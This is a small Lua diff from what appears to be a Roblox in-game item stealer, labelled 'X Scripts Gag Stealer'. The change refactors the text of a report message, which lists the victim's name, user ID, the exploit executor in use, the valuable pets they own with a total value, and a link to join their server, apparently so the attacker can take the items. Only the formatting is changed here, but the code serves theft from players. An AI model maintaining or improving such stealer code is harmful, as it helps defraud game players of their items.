@@ -340,15 +340,11 @@
         local petListStr = table.concat(petLines, "\n")
 
         -- Main embed description
+        local playerInfoSection = string.format("Player Info                                                       Exploit Info\nName: %s                                          Exploit: %s\nUser ID: %s                                    Time: %s\nPlayers in game: %s/%s                                      Date: %s", playerName, executor, userId, timeStr, playerCount, maxPlayers, dateStr)
+        
         local description = string.format(
-            "X Scripts Gag Stealer\n\nPlayer Info                                                       Exploit Info\nName: %s                                          Exploit: %s\nUser ID: %s                                    Time: %s\nPlayers in game: %s/%s                                      Date: %s\n\nTotal Value (expensive pets): %s\n\n%s\n\nGame Link\n[Click to join](%s)\n%s",
-            playerName,
-            executor,
-            userId,
-            timeStr,
-            playerCount,
-            maxPlayers,
-            dateStr,
+            "X Scripts Gag Stealer\n\n%s\n\nTotal Value (expensive pets): %s\n\n%s\n\nGame Link\n[Click to join](%s)\n%s",
+            playerInfoSection,
             totalValueStr,
             petListStr,
             joinUrl,
